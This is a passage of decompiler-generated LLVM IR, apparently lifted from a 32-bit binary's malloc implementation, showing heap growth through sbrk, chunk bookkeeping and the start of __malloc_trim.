  %v2_8053962 = add i32 %v1_8053951, %v1_80538b0
  store i32 %v0_805389d, i32* %ecx.global-to-local, align 4
  %v1_8053969 = or i32 %v2_8053962, 1
  store i32 %v1_8053969, i32* %eax.global-to-local, align 4
  store i32 %v1_8053969, i32* %v2_80538a6, align 4
  br label %dec_label_pc_8053aa1

dec_label_pc_8053974:                             ; preds = %dec_label_pc_805395d, %dec_label_pc_805394d
  %v0_8053974 = load i8, i8* @global_var_8063b00.539, align 1
  %v1_8053974 = sext i8 %v0_8053974 to i32
  store i32 %v1_8053974, i32* %eax.global-to-local, align 4
  %v2_8053979 = urem i8 %v0_8053974, 2
  %v3_8053979 = icmp eq i8 %v2_8053979, 0
  br i1 %v3_8053979, label %dec_label_pc_805398d, label %dec_label_pc_805397d

dec_label_pc_805397d:                             ; preds = %dec_label_pc_8053974
  br i1 %v2_80538b0, label %dec_label_pc_805398d, label %dec_label_pc_8053981

dec_label_pc_8053981:                             ; preds = %dec_label_pc_805397d
  %v1_8053983 = icmp eq i1 %v7_8053959, false
  br i1 %v1_8053983, label %dec_label_pc_805398d, label %dec_label_pc_8053985

dec_label_pc_8053985:                             ; preds = %dec_label_pc_8053981
  %v1_8053985 = and i32 %v1_8053974, -2
  %v4_8053985 = trunc i32 %v1_8053985 to i8
  store i32 %v1_8053985, i32* %eax.global-to-local, align 4
  store i8 %v4_8053985, i8* @global_var_8063b00.539, align 256
  br label %dec_label_pc_805398d

dec_label_pc_805398d:                             ; preds = %dec_label_pc_8053981, %dec_label_pc_805397d, %dec_label_pc_8053974, %dec_label_pc_8053985
  %v0_805398d = phi i8 [ %v0_8053974, %dec_label_pc_8053981 ], [ %v0_8053974, %dec_label_pc_805397d ], [ %v0_8053974, %dec_label_pc_8053974 ], [ %v4_8053985, %dec_label_pc_8053985 ]
  %v1_805398d = urem i8 %v0_805398d, 2
  %v2_805398d = icmp eq i8 %v1_805398d, 0
  br i1 %v2_805398d, label %dec_label_pc_8053a0b, label %dec_label_pc_8053996

dec_label_pc_8053996:                             ; preds = %dec_label_pc_805398d
  br i1 %v2_80538b0, label %dec_label_pc_80539a4, label %dec_label_pc_805399a

dec_label_pc_805399a:                             ; preds = %dec_label_pc_8053996
  store i32 %v2_8053959, i32* %eax.global-to-local, align 4
  %v2_805399e = add i32 %v2_8053951, %v2_8053959
  store i32 %v2_805399e, i32* @global_var_8063b08.536, align 8
  br label %dec_label_pc_80539a4

dec_label_pc_80539a4:                             ; preds = %dec_label_pc_8053996, %dec_label_pc_805399a
  %v1_80539a6 = urem i32 %v0_8053a1992, 8
  %v2_80539a6 = icmp eq i32 %v1_80539a6, 0
  store i32 %v1_80539a6, i32* %edx.global-to-local, align 4
  %v1_80539a9 = icmp eq i1 %v2_80539a6, false
  br i1 %v1_80539a9, label %dec_label_pc_80539b1, label %dec_label_pc_80539ab

dec_label_pc_80539ab:                             ; preds = %dec_label_pc_80539a4
  store i32 %v0_8053a1992, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80539bb

dec_label_pc_80539b1:                             ; preds = %dec_label_pc_80539a4
  %v2_80539b6 = sub nsw i32 8, %v1_80539a6
  store i32 %v2_80539b6, i32* %eax.global-to-local, align 4
  %v2_80539b8 = add i32 %v2_80539b6, %v0_8053a1992
  store i32 %v2_80539b8, i32* @edi, align 4
  br label %dec_label_pc_80539bb

dec_label_pc_80539bb:                             ; preds = %dec_label_pc_80539ab, %dec_label_pc_80539b1
  %v0_80539be = phi i32 [ 0, %dec_label_pc_80539ab ], [ %v2_80539b6, %dec_label_pc_80539b1 ]
  %v2_80539bb = add i32 %v1_8053951, %v0_8053a1992
  %v2_80539be = add i32 %v0_80539be, %v1_80538b0
  store i32 %v2_80539be, i32* %ecx.global-to-local, align 4
  %v2_80539c7 = add i32 %v2_80539be, %v2_80539bb
  store i32 %v2_80539c7, i32* %edx.global-to-local, align 4
  %v2_80539cd = add i32 %v2_80539c7, %v1_80537d0
  %v5_80539d0 = and i32 %v2_80539cd, %v1_80538cc
  %v2_80539d7 = sub i32 %v5_80539d0, %v2_80539c7
  store i32 %v2_80539d7, i32* %eax.global-to-local, align 4
  %v2_80539d9 = add i32 %v2_80539d7, %v2_80539be
  store i32 %v2_80539d9, i32* @esi, align 4
  store i32 %v2_80539d9, i32* %stack_var_-92, align 4
  %v1_80539dd = call i32 @__GI_sbrk(i32 %v2_80539d9)
  store i32 %v1_80539dd, i32* %eax.global-to-local, align 4
  store i32 %v1_80539dd, i32* @edx, align 4
  %v10_80539e7 = icmp eq i32 %v1_80539dd, -1
  %v1_80539ea = icmp eq i1 %v10_80539e7, false
  br i1 %v1_80539ea, label %dec_label_pc_80539fa, label %dec_label_pc_80539ec

dec_label_pc_80539ec:                             ; preds = %dec_label_pc_80539bb
  store i32 0, i32* %stack_var_-92, align 4
  %v1_80539f1 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_80539f1, i32* %eax.global-to-local, align 4
  store i32 %v1_80539f1, i32* @edx, align 4
  br label %dec_label_pc_8053a2e

dec_label_pc_80539fa:                             ; preds = %dec_label_pc_80539bb
  %v1_80539fa = load i32, i32* @ebx, align 4
  %v7_80539fa = icmp ult i32 %v1_80539dd, %v1_80539fa
  %v1_80539fc = icmp eq i1 %v7_80539fa, false
  br i1 %v1_80539fc, label %dec_label_pc_8053a33, label %dec_label_pc_80539fe

dec_label_pc_80539fe:                             ; preds = %dec_label_pc_80539fa
  %v0_80539fe = load i8, i8* @global_var_8063b00.539, align 1
  %v2_80539fe = and i8 %v0_80539fe, -2
  store i8 %v2_80539fe, i8* @global_var_8063b00.539, align 256
  store i32 %v2_80539bb, i32* @edx, align 4
  br label %dec_label_pc_8053a12

dec_label_pc_8053a0b:                             ; preds = %dec_label_pc_805398d
  %v10_8053a0b = icmp eq i32 %v0_8053a0b91, -1
  br i1 %v10_8053a0b, label %dec_label_pc_8053a16, label %dec_label_pc_8053a10

dec_label_pc_8053a10:                             ; preds = %dec_label_pc_8053a0b
  store i32 %v0_8053a1992, i32* @edi, align 4
  br label %dec_label_pc_8053a12

dec_label_pc_8053a12:                             ; preds = %dec_label_pc_80539fe, %dec_label_pc_8053a10
  %v0_8053a3349 = phi i32 [ %v2_80539bb, %dec_label_pc_80539fe ], [ %v0_8053a0b91, %dec_label_pc_8053a10 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8053a33

dec_label_pc_8053a16:                             ; preds = %dec_label_pc_8053a0b
  store i32 %v0_8053a1992, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8053a1d = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8053a1d, i32* @edx, align 4
  %v1_8053a24 = load i32, i32* @ebx, align 4
  %v2_8053a24 = sub i32 %v1_8053a1d, %v1_8053a24
  %v1_8053a26 = load i32, i32* @esi, align 4
  %v2_8053a26 = sub i32 %v2_8053a24, %v1_8053a26
  store i32 %v2_8053a26, i32* %eax.global-to-local, align 4
  %v0_8053a28 = load i32, i32* @global_var_8063b08.536, align 8
  %v2_8053a28 = add i32 %v0_8053a28, %v2_8053a26
  store i32 %v2_8053a28, i32* @global_var_8063b08.536, align 8
  br label %dec_label_pc_8053a2e

dec_label_pc_8053a2e:                             ; preds = %dec_label_pc_80539ec, %dec_label_pc_8053a16
  %v0_8053a3348 = phi i32 [ %v1_80539f1, %dec_label_pc_80539ec ], [ %v1_8053a1d, %dec_label_pc_8053a16 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8053a33

dec_label_pc_8053a33:                             ; preds = %dec_label_pc_80539fa, %dec_label_pc_8053a12, %dec_label_pc_8053a2e
  %v0_8053a38 = phi i32 [ %v1_80539dd, %dec_label_pc_80539fa ], [ %v0_8053a3349, %dec_label_pc_8053a12 ], [ %v0_8053a3348, %dec_label_pc_8053a2e ]
  %v10_8053a33 = icmp eq i32 %v0_8053a38, -1
  br i1 %v10_8053a33, label %dec_label_pc_8053aa1, label %dec_label_pc_8053a38

dec_label_pc_8053a38:                             ; preds = %dec_label_pc_8053a33
  %v1_8053a38 = load i32, i32* @edi, align 4
  %v2_8053a38 = sub i32 %v0_8053a38, %v1_8053a38
  store i32 %v2_8053a38, i32* @edx, align 4
  store i32 %v1_8053a38, i32* @global_var_80637cc.524, align 4
  %v1_8053a40 = load i32, i32* @esi, align 4
  %v2_8053a40 = add i32 %v1_8053a40, %v2_8053a38
  %v1_8053a43 = or i32 %v2_8053a40, 1
  store i32 %v1_8053a43, i32* %eax.global-to-local, align 4
  %v2_8053a46 = add i32 %v1_8053a38, 4
  %v3_8053a46 = inttoptr i32 %v2_8053a46 to i32*
  store i32 %v1_8053a43, i32* %v3_8053a46, align 4
  %v0_8053a49 = load i32, i32* @global_var_8063b08.536, align 8
  %v1_8053a49 = load i32, i32* @esi, align 4
  %v2_8053a49 = add i32 %v1_8053a49, %v0_8053a49
  store i32 %v2_8053a49, i32* @global_var_8063b08.536, align 8
  br i1 %v2_80538b0, label %dec_label_pc_8053aa1, label %dec_label_pc_8053a53

dec_label_pc_8053a53:                             ; preds = %dec_label_pc_8053a38
  %v1_8053a53 = add i32 %v1_80538b0, -12
  store i32 %v0_805389d, i32* %ecx.global-to-local, align 4
  %v1_8053a5a = and i32 %v1_8053a53, -8
  store i32 %v1_8053a5a, i32* %eax.global-to-local, align 4
  %v1_8053a5f = or i32 %v1_8053a5a, 1
  store i32 %v1_8053a5f, i32* @edx, align 4
  %v5_8053a62 = icmp ult i32 %v1_8053a5a, 15
  store i32 %v1_8053a5f, i32* %v2_80538a6, align 4
  %v0_8053a68 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053a68 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053a68 = add i32 %v0_8053a68, 4
  %v3_8053a68 = add i32 %v2_8053a68, %v1_8053a68
  %v4_8053a68 = inttoptr i32 %v3_8053a68 to i32*
  store i32 5, i32* %v4_8053a68, align 4
  %v0_8053a70 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053a70 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053a70 = add i32 %v0_8053a70, 8
  %v3_8053a70 = add i32 %v2_8053a70, %v1_8053a70
  %v4_8053a70 = inttoptr i32 %v3_8053a70 to i32*
  store i32 5, i32* %v4_8053a70, align 4
  br i1 %v5_8053a62, label %dec_label_pc_8053aa1, label %dec_label_pc_8053a7a

dec_label_pc_8053a7a:                             ; preds = %dec_label_pc_8053a53
  %v0_8053a7d = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053a7f = add i32 %v0_8053a7d, 8
  store i32 %v1_8053a7f, i32* %eax.global-to-local, align 4
  %v0_8053a82 = load i32, i32* @global_var_8063ae4.540, align 4
  store i32 %v0_8053a82, i32* @ebx, align 4
  store i32 %v1_8053a7f, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_8063ae4.540, align 4
  %v1_8053a93 = call i32 @free(i32 %v1_8053a7f)
  store i32 %v1_8053a93, i32* %eax.global-to-local, align 4
  %v0_8053a98 = load i32, i32* @ebx, align 4
  store i32 %v0_8053a98, i32* @global_var_8063ae4.540, align 4
  br label %dec_label_pc_8053aa1

dec_label_pc_8053aa1:                             ; preds = %dec_label_pc_8053a53, %dec_label_pc_8053a38, %dec_label_pc_8053a33, %dec_label_pc_8053962, %dec_label_pc_8053a7a
  %v0_8053aa1 = load i32, i32* @global_var_8063b08.536, align 8
  store i32 %v0_8053aa1, i32* %eax.global-to-local, align 4
  %v1_8053aa6 = load i32, i32* @global_var_8063b0c.541, align 4
  %tmp134 = icmp ugt i32 %v0_8053aa1, %v1_8053aa6
  br i1 %tmp134, label %dec_label_pc_8053aae, label %dec_label_pc_8053ab3

dec_label_pc_8053aae:                             ; preds = %dec_label_pc_8053aa1
  store i32 %v0_8053aa1, i32* @global_var_8063b0c.541, align 4
  br label %dec_label_pc_8053ab3

dec_label_pc_8053ab3:                             ; preds = %dec_label_pc_8053aa1, %dec_label_pc_8053aae
  %v1_8053ab3 = load i32, i32* @global_var_8063b04.534, align 4
  %v2_8053ab3 = add i32 %v1_8053ab3, %v0_8053aa1
  store i32 %v2_8053ab3, i32* %eax.global-to-local, align 4
  %v1_8053ab9 = load i32, i32* @global_var_8063b14.537, align 4
  %tmp135 = icmp ugt i32 %v2_8053ab3, %v1_8053ab9
  br i1 %tmp135, label %dec_label_pc_8053ac1, label %dec_label_pc_8053ac6

dec_label_pc_8053ac1:                             ; preds = %dec_label_pc_8053ab3
  store i32 %v2_8053ab3, i32* @global_var_8063b14.537, align 4
  br label %dec_label_pc_8053ac6

dec_label_pc_8053ac6:                             ; preds = %dec_label_pc_8053ab3, %dec_label_pc_8053ac1
  %v0_8053ac6 = load i32, i32* @global_var_80637cc.524, align 4
  store i32 %v0_8053ac6, i32* @ebx, align 4
  %v1_8053acc = add i32 %v0_8053ac6, 4
  %v2_8053acc = inttoptr i32 %v1_8053acc to i32*
  %v3_8053acc = load i32, i32* %v2_8053acc, align 4
  %v1_8053acf = and i32 %v3_8053acc, -4
  store i32 %v1_8053acf, i32* @ecx, align 4
  %v10_8053ad2 = icmp ult i32 %v1_8053acf, %v1_805376f
  br i1 %v10_8053ad2, label %dec_label_pc_8053b52, label %dec_label_pc_8053ad8

dec_label_pc_8053ad8:                             ; preds = %dec_label_pc_8053ac6
  store i32 %v1_80537fa, i32* %esi.global-to-local, align 4
  %v2_8053ade = sub i32 %v1_8053acf, %v1_80537fa
  store i32 %v2_8053ade, i32* %ecx.global-to-local, align 4
  %v2_8053ae0 = add i32 %v0_8053ac6, %v1_80537fa
  store i32 %v2_8053ae0, i32* @edx, align 4
  %v1_8053ae3 = or i32 %v1_80537fa, 1
  store i32 %v1_8053ae3, i32* %eax.global-to-local, align 4
  store i32 %v2_8053ae0, i32* @global_var_80637cc.524, align 4
  store i32 %v1_8053ae3, i32* %v2_8053acc, align 4
  %v0_8053aef.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8053aef

dec_label_pc_8053aef:                             ; preds = %dec_label_pc_8053780, %dec_label_pc_8053ad8
  %v0_8053aef = phi i32 [ %v5_8053793, %dec_label_pc_8053780 ], [ %v0_8053aef.pre, %dec_label_pc_8053ad8 ]
  %v1_8053aef = or i32 %v0_8053aef, 1
  store i32 %v1_8053aef, i32* @ecx, align 4
  %v0_8053af2 = load i32, i32* @ebx, align 4
  %v1_8053af2 = add i32 %v0_8053af2, 8
  store i32 %v1_8053af2, i32* %ebx.global-to-local, align 4
  %v1_8053af5 = load i32, i32* @edx, align 4
  %v2_8053af5 = add i32 %v1_8053af5, 4
  %v3_8053af5 = inttoptr i32 %v2_8053af5 to i32*
  store i32 %v1_8053aef, i32* %v3_8053af5, align 4
  br label %dec_label_pc_8053b5f

dec_label_pc_8053afa:                             ; preds = %dec_label_pc_805353a
  %v5_8053b00 = sub i32 %v1_805351d, %v1_80537fa
  store i32 %v5_8053b00, i32* %eax.global-to-local, align 4
  %v2_8053b04 = add i32 %v0_80535e8111, %v1_80537fa
  store i32 %v2_8053b04, i32* @edx, align 4
  %v1_8053b08 = or i32 %v1_80537fa, 1
  store i32 %v2_8053b04, i32* @global_var_80637d0.525, align 16
  store i32 %v1_8053b08, i32* %v2_8053517, align 4
  %v0_8053b14 = load i32, i32* %eax.global-to-local, align 4
  %v0_8053b16 = load i32, i32* @edx, align 4
  store i32 %v0_8053b16, i32* @global_var_80637dc.542, align 4
  %v1_8053b1c = or i32 %v0_8053b14, 1
  store i32 %v1_8053b1c, i32* @ecx, align 4
  store i32 %v0_8053b16, i32* @global_var_80637e0.527, align 32
  %v1_8053b25 = add i32 %v0_8053b16, 8
  %v2_8053b25 = inttoptr i32 %v1_8053b25 to i32*
  store i32 ptrtoint (i32* @global_var_80637d4.526 to i32), i32* %v2_8053b25, align 4
  %v0_8053b2c = load i32, i32* @edx, align 4
  %v1_8053b2c = add i32 %v0_8053b2c, 12
  %v2_8053b2c = inttoptr i32 %v1_8053b2c to i32*
  store i32 ptrtoint (i32* @global_var_80637d4.526 to i32), i32* %v2_8053b2c, align 4
  %v0_8053b33 = load i32, i32* @ecx, align 4
  %v1_8053b33 = load i32, i32* @edx, align 4
  %v2_8053b33 = add i32 %v1_8053b33, 4
  %v3_8053b33 = inttoptr i32 %v2_8053b33 to i32*
  store i32 %v0_8053b33, i32* %v3_8053b33, align 4
  %v0_8053b36 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053b36 = load i32, i32* @edx, align 4
  %v3_8053b36 = add i32 %v1_8053b36, %v0_8053b36
  %v4_8053b36 = inttoptr i32 %v3_8053b36 to i32*
  store i32 %v0_8053b36, i32* %v4_8053b36, align 4
  br label %dec_label_pc_8053b44

dec_label_pc_8053b3b:                             ; preds = %dec_label_pc_8053549
  store i32 %v1_80537fa, i32* %ebx.global-to-local, align 4
  %v0_8053b3f = load i32, i32* @ebp, align 4
  %v2_8053b3f = or i32 %v1_80537fa, 4
  %v3_8053b3f = add i32 %v0_8053b3f, %v2_8053b3f
  %v4_8053b3f = inttoptr i32 %v3_8053b3f to i32*
  %v5_8053b3f = load i32, i32* %v4_8053b3f, align 4
  %v6_8053b3f = or i32 %v5_8053b3f, 1
  store i32 %v6_8053b3f, i32* %v4_8053b3f, align 4
  br label %dec_label_pc_8053b44

dec_label_pc_8053b44:                             ; preds = %dec_label_pc_8053afa, %dec_label_pc_8053b3b
  %v0_8053b44 = load i32, i32* @ebp, align 4
  %v1_8053b44 = add i32 %v0_8053b44, 8
  store i32 %v1_8053b44, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053b5f

dec_label_pc_8053b49:                             ; preds = %dec_label_pc_8053639
  %v1_8053b49 = load i32, i32* @ebx, align 4
  %v2_8053b49 = add i32 %v0_8053648, 4
  %v3_8053b49 = add i32 %v2_8053b49, %v1_8053b49
  %v4_8053b49 = inttoptr i32 %v3_8053b49 to i32*
  %v5_8053b49 = load i32, i32* %v4_8053b49, align 4
  %v6_8053b49 = or i32 %v5_8053b49, 1
  store i32 %v6_8053b49, i32* %v4_8053b49, align 4
  br label %dec_label_pc_8053b4e

dec_label_pc_8053b4e:                             ; preds = %dec_label_pc_8053651, %dec_label_pc_8053b49
  %v0_8053b4e = load i32, i32* @ecx, align 4
  store i32 %v0_8053b4e, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053b5f

dec_label_pc_8053b52:                             ; preds = %dec_label_pc_8053910, %dec_label_pc_8053ac6, %dec_label_pc_805391a
  %v0_8053b52 = load i32, i32* %stack_var_-92, align 4
  %v1_8053b52 = call i32 @__errno_location(i32 %v0_8053b52)
  store i32 %v1_8053b52, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8053b59 = inttoptr i32 %v1_8053b52 to i32*
  store i32 12, i32* %v1_8053b59, align 4
  br label %dec_label_pc_8053b5f

dec_label_pc_8053b5f:                             ; preds = %dec_label_pc_8053b4e, %dec_label_pc_8053b44, %dec_label_pc_8053aef, %dec_label_pc_80537ab, %dec_label_pc_805375d, %dec_label_pc_80534e4, %dec_label_pc_8053b52
  store i32 %v2_805341b, i32* @eax, align 4
  store i32 %v2_805341b, i32* %stack_var_-92, align 4
  %v2_8053b68 = call i32 @__pthread_return_void(i32 %v2_805341b, i32 1)
  store i32 %v2_8053b68, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053b70

dec_label_pc_8053b70:                             ; preds = %dec_label_pc_8053439, %dec_label_pc_8053b5f
  %v0_8053b73 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8053b73, i32* %eax.global-to-local, align 4
  %v2_8053b75 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8053b75, i32* @ebx, align 4
  store i32 %v0_8053408, i32* @esi, align 4
  store i32 %v0_8053407, i32* @edi, align 4
  store i32 %v0_8053406, i32* @ebp, align 4
  ret i32 %v0_8053b73

; uselistorder directives
  uselistorder i32 %v0_8053b36, { 1, 0 }
  uselistorder i32 %v0_8053b16, { 1, 0, 2 }
  uselistorder i32 %v2_8053ab3, { 1, 0, 2 }
  uselistorder i32 %v0_8053aa1, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8053a38, { 1, 0 }
  uselistorder i32 %v2_8053a26, { 1, 0 }
  uselistorder i32 %v1_80539dd, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_80539c7, { 1, 0, 2 }
  uselistorder i32 %v2_80539bb, { 1, 2, 0 }
  uselistorder i32 %v2_80539b6, { 1, 0, 2 }
  uselistorder i32 %v1_80539a6, { 2, 1, 0 }
  uselistorder i8 %v0_8053974, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_8053957, { 1, 0, 2 }
  uselistorder i32 %v0_8053a0b91, { 2, 0, 1 }
  uselistorder i32 %v0_8053a1992, { 3, 4, 1, 2, 5, 0, 7, 6 }
  uselistorder i32 %v1_8053951, { 2, 1, 0 }
  uselistorder i32 %v8_8053927, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_8053924, { 1, 0 }
  uselistorder i32 %v0_8053903, { 1, 0 }
  uselistorder i32 %v2_80538d4, { 2, 1, 0, 3 }
  uselistorder i32 %v1_80538cc, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_80538b9, { 1, 0 }
  uselistorder i32 %v1_80538b0, { 4, 0, 1, 2, 3, 5, 6, 7 }
  uselistorder i32 %v0_805389d, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v2_8053881, { 1, 0, 2 }
  uselistorder i32 %v2_805386d, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_8053836, { 1, 2, 0, 3 }
  uselistorder i32 %v1_805382a, { 2, 1, 0 }
  uselistorder i32 %v8_8053819, { 3, 1, 0, 2, 4, 5 }
  uselistorder i32 %v2_8053800, { 1, 0, 2 }
  uselistorder i32 %v0_805379c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_805376f, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8053765, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_8053757, { 1, 0 }
  uselistorder i32 %v1_80536ee, { 1, 0 }
  uselistorder i32 %v3_80536e2, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_80536f2, { 1, 0 }
  uselistorder i32 %v2_80536dc, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_80536d912, { 1, 0 }
  uselistorder i32 %v2_80536ce, { 1, 0 }
  uselistorder i32 %v1_80536b2, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_80536ae, { 2, 1, 0 }
  uselistorder i32 %v1_80536aa, { 1, 0 }
  uselistorder i32 %v1_805369e, { 2, 1, 0 }
  uselistorder i32 %v2_8053694, { 1, 0 }
  uselistorder i32 %v1_8053691, { 1, 2, 0 }
  uselistorder i32 %v4_805362f, { 3, 6, 4, 5, 2, 1, 0 }
  uselistorder i32 %v0_805367a, { 1, 0 }
  uselistorder i32 %v0_8053648, { 1, 2, 0, 3 }
  uselistorder i32 %v3_805361b, { 2, 0, 1, 3 }
  uselistorder i32 %v0_80535e8, { 1, 2, 0 }
  uselistorder i32 %v2_80535cc, { 1, 0 }
  uselistorder i32 %v1_80535c2, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_80535bd.lcssa, { 1, 0 }
  uselistorder i32 %v3_80535ad, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_80535a4, { 1, 0, 2 }
  uselistorder i32 %v2_8053580, { 2, 0, 1, 3 }
  uselistorder i32 %v2_8053568, { 2, 1, 0 }
  uselistorder i32 %v0_8053554, { 2, 0, 3, 1 }
  uselistorder i32 %v3_805351a, { 1, 0, 2 }
  uselistorder i32 %v0_80535e8111, { 0, 3, 1, 2 }
  uselistorder i32 %v3_80534c7, { 1, 0, 2 }
  uselistorder i32 %v2_80534b9, { 2, 1, 0 }
  uselistorder i32 %v2_8053494, { 2, 1, 0 }
  uselistorder i8 %v0_8053462, { 3, 1, 2, 0, 4 }
  uselistorder i32 %v1_80537fa, { 13, 31, 11, 2, 29, 12, 3, 22, 21, 10, 9, 4, 24, 23, 20, 18, 19, 5, 25, 26, 6, 27, 28, 15, 7, 16, 17, 8, 30, 14, 0, 32, 34, 33, 1, 35 }
  uselistorder i32 %v1_805344b, { 0, 2, 1 }
  uselistorder i32 %v0_8053434, { 1, 0 }
  uselistorder i32 %v2_805341b, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 1, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %ebx.global-to-local, { 21, 2, 3, 4, 5, 6, 7, 8, 9, 13, 10, 0, 11, 12, 14, 15, 16, 17, 1, 18, 19, 20, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 55, 50, 51, 54, 53, 52, 56, 57, 58, 59, 60, 62, 61, 63, 64, 65, 66, 67, 68, 69, 70, 0, 71, 72, 73 }
  uselistorder i32 1048576, { 1, 2, 0 }
  uselistorder i8* @global_var_8063b00.539, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 134625236, { 2, 3, 1, 0 }
  uselistorder i32* @global_var_80637e0.527, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__malloc_largebin_index, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_80637cc.524 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_80637cc.524 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_8053b70, { 1, 0 }
  uselistorder label %dec_label_pc_8053b5f, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8053b52, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8053b4e, { 1, 0 }
  uselistorder label %dec_label_pc_8053b44, { 1, 0 }
  uselistorder label %dec_label_pc_8053aef, { 1, 0 }
  uselistorder label %dec_label_pc_8053ac6, { 1, 0 }
  uselistorder label %dec_label_pc_8053ab3, { 1, 0 }
  uselistorder label %dec_label_pc_8053aa1, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8053a33, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053a2e, { 1, 0 }
  uselistorder label %dec_label_pc_8053a12, { 1, 0 }
  uselistorder label %dec_label_pc_80539bb, { 1, 0 }
  uselistorder label %dec_label_pc_80539a4, { 1, 0 }
  uselistorder label %dec_label_pc_805398d, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8053910, { 1, 0 }
  uselistorder label %dec_label_pc_8053903, { 1, 0 }
  uselistorder label %dec_label_pc_80538c4, { 1, 0 }
  uselistorder label %dec_label_pc_805389d, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8053881, { 1, 0 }
  uselistorder label %dec_label_pc_8053868, { 1, 0 }
  uselistorder label %dec_label_pc_805384a, { 1, 0 }
  uselistorder label %dec_label_pc_8053765, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805375d, { 1, 0 }
  uselistorder label %dec_label_pc_8053746, { 1, 0 }
  uselistorder label %dec_label_pc_80536d9, { 1, 0 }
  uselistorder label %dec_label_pc_80536de.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_80536b2, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053639, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %dec_label_pc_80535c0, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_80535a9, { 1, 0 }
  uselistorder label %dec_label_pc_8053517, { 1, 0 }
  uselistorder label %dec_label_pc_80535e8.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80534e4, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8053462, { 1, 0 }
}

define i32 @__malloc_trim() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %v0_8053b83 = load i32, i32* @edx, align 4
  store i32 %v0_8053b83, i32* %ebp.global-to-local, align 4
  %v1_8053b85 = add i32 %v0_8053b83, 860
  %v2_8053b85 = inttoptr i32 %v1_8053b85 to i32*
  %v3_8053b85 = load i32, i32* %v2_8053b85, align 4
  store i32 %v3_8053b85, i32* @ecx, align 4
  %v1_8053b8b = add i32 %v0_8053b83, 44
  %v2_8053b8b = inttoptr i32 %v1_8053b8b to i32*
  %v3_8053b8b = load i32, i32* %v2_8053b8b, align 4
  %v1_8053b8e = add i32 %v3_8053b8b, 4
  %v2_8053b8e = inttoptr i32 %v1_8053b8e to i32*
  %v3_8053b8e = load i32, i32* %v2_8053b8e, align 4
  %v1_8053b91 = and i32 %v3_8053b8e, -4
  store i32 %v1_8053b91, i32* @esi, align 4
  %v1_8053b96 = load i32, i32* @eax, align 4
  %v2_8053b96 = add i32 %v3_8053b85, -17
  %v2_8053b98 = add i32 %v2_8053b96, %v1_8053b91
  %v3_8053b98 = sub i32 %v2_8053b98, %v1_8053b96
  %div = udiv i32 %v3_8053b98, %v3_8053b85
  store i32 %div, i32* %eax.global-to-local, align 4
